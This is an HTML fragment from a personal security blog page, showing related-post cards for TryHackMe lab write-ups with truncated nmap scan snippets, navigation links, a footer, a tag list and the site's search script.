mb-4"><div class="card"> <a href="/blog/posts/basic_pentesting/"><div class="card-body"> <span class="timeago small" > Jan 23 <i class="unloaded">2021-01-23T08:46:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Basic Pentesting WRITE-UP</h3><div class="text-muted small"><p> BOX NAME: Basic Pentesting NMAP $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.31.163 $ @ Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-21 08:36 UTC Nmap scan report for 10.10.31.163 Host i...</p></div></div></a></div><div class="card"> <a href="/blog/posts/Pickle_Rick-en/"><div class="card-body"> <span class="timeago small" > Feb 6 <i class="unloaded">2021-02-06T08:46:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Pickle Rick - WRITE-UP</h3><div class="text-muted small"><p> BOX NAME: Pickle Rick NMAP $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.73.110 $ @ Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-24 09:19 UTC Nmap scan report for 10.10.73.110 Host is up ...</p></div></div></a></div><div class="card"> <a href="/blog/posts/Year_Of_The_Rabbit/"><div class="card-body"> <span class="timeago small" > Feb 18 <i class="unloaded">2021-02-18T08:46:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Year Of The Rabbit - WRITE-UP</h3><div class="text-muted small"><p> BOX NAME: Year of The Rabbit NMAP $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.100.98 $ @ Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-22 08:13 UTC Nmap scan report for 10.10.100.98 Host...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/blog/posts/Year_Of_The_Rabbit/" class="btn btn-outline-primary" prompt="Older"><p>TryHackMe - Year Of The Rabbit - WRITE-UP</p></a> <a href="/blog/posts/Preparing-your-PHYSICAL-android-device-for-bug-bounty-part-1/" class="btn btn-outline-primary" prompt="Newer"><p>Preparing your PHYSICAL Android device for Bug-Bounty Part 1</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/cloufisz">Bartholomew Mokrzycki</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/blog/tags/devsecops/">devsecops</a> <a class="post-tag" href="/blog/tags/beginner/">beginner</a> <a class="post-tag" href="/blog/tags/containers/">containers</a> <a class="post-tag" href="/blog/tags/docker/">docker</a> <a class="post-tag" href="/blog/tags/blog/">blog</a> <a class="post-tag" href="/blog/tags/cms/">cms</a> <a class="post-tag" href="/blog/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/blog/tags/owasp/">owasp</a> <a class="post-tag" href="/blog/tags/pentesting-lab/">pentesting lab</a> <a class="post-tag" href="/blog/tags/zaproxy/">zaproxy</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://cloufish.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
